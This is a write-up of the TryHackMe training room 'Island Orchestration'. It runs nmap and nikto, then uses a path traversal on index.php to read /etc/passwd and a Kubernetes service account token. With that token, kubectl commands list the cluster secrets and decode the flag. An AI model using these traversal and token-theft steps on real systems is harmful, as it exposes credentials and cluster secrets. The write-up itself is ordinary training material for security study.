# Island Orchestration writeup

This is a writeup for TryHackMe room `Island Orchestration` over at https://tryhackme.com/room/islandorchestration

## nmap

Let's find out what's running

```
nmap -sCV IP -v -T5
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          Apache httpd 2.2.22 ((Ubuntu))
8443/tcp open  ssl/https-alt minikubeCA
```

So we've got a website port 80, SSH port 22 and a minikube instance port 8443

## Website

I have a usual workflow I use to enumerate websites:

- gobuster
- enum4linux
- nikto

Here the first 2 don't give much info but nikto gives us

```
nikto -host IP
/index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing etc...
```

passwd and shadow don't reveal anything.

Knowing this is a kube CTF, the obvious info that I could need is in the serviceaccount directory

It's located at `/var/run/secrets/kubernetes.io/serviceaccount`

Now the interesting files in there are `ca.cert` and `token`

They both exist. We only need the token for this room. It's a simple JWT token that can be decoded at https://jwt.io

You can find namespace and other info that we don't need this time.

## Kube

For the rest of the room you need to have kubectl installed on your machine.
You can find the necessary info here https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/

With the auth token we can now query the remote minikube cluster from our local machine.

Syntax will be `kubectl --server https://IP:PORT --token TOKEN --insecure-skip-tls-verify COMMAND`

We already know kube's port 8443 and we have a token. You can create a temporary alias for this.

### Secrets

Kube secrets are the first thing to look at

`kubectl --server https://IP:8443 --token TOKEN --insecure-skip-tls-verify get secrets`

We get a list of secrets

```
NAME                  TYPE                                  DATA   AGE
default-token-8bksk   kubernetes.io/service-account-token   3      180d
flag                  Opaque                                1      125d
islands-token-dtrnt   kubernetes.io/service-account-token   3      125d
```

One obvious thing strikes us, they have a secret called flag.

`kubectl --server https://IP:8443 --token TOKEN --insecure-skip-tls-verify get secret flag -o yaml`

This command retrieves secret's contents in yaml output format

```
...
data:
  flag: SECRET_HERE
kind: Secret
...
```

The secret value is usually base64 encoded so `echo "SECRET" | base64 -d` to get the flag and complete the room.

If you find kubernetes security interesting, head over https://tryhackme.com/hacktivities?tab=search and search for 'kube' rooms.

There should be 5 more for you to enjoy. (somewhat more advanced than this one)

You can then come back to this room and see if you can get root :D
